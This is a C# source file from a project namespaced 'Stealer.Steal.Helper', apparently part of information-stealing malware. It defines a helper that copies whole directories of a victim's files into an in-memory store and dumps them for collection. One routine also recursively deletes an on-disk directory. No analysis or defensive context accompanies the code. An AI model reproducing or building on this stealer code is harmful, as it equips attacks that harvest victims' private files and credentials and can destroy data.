using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Stealer.Steal.Helper;

internal class DynamicFiles
{
	public static List<object> files = new List<object>();

	public static void WriteAllBytes(string path, byte[] buffer)
	{
		if (buffer.Length >= 1)
		{
			files.Add(new object[2] { path, buffer });
		}
	}

	public static void WriteAllText(string path, string text)
	{
		if (text.Length >= 1)
		{
			files.Add(new object[2]
			{
				path,
				Encoding.UTF8.GetBytes(text)
			});
		}
	}

	public static bool DirectoryExists(string path)
	{
		object[] array = files.ToArray();
		int num = 0;
		while (num < array.Length)
		{
			string path2 = (string)((object[])array[num++])[0];
			try
			{
				if (Path.GetDirectoryName(path2).StartsWith(path))
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	public static void CopyDirectory(string sourceDir, string virtualDir)
	{
		string[] array = Directory.GetFiles(sourceDir);
		foreach (string path in array)
		{
			string fileName = Path.GetFileName(path);
			WriteAllBytes(Path.Combine(virtualDir, fileName), File.ReadAllBytes(path));
		}
		array = Directory.GetDirectories(sourceDir);
		foreach (string text in array)
		{
			string fileName2 = Path.GetFileName(text);
			string text2 = Path.Combine(virtualDir, fileName2);
			if (Directory.Exists(text2))
			{
				Directory.Delete(text2, recursive: true);
			}
			CopyDirectory(text, text2);
		}
	}

	public static object[] DumpFiles()
	{
		return files.ToArray();
	}
}
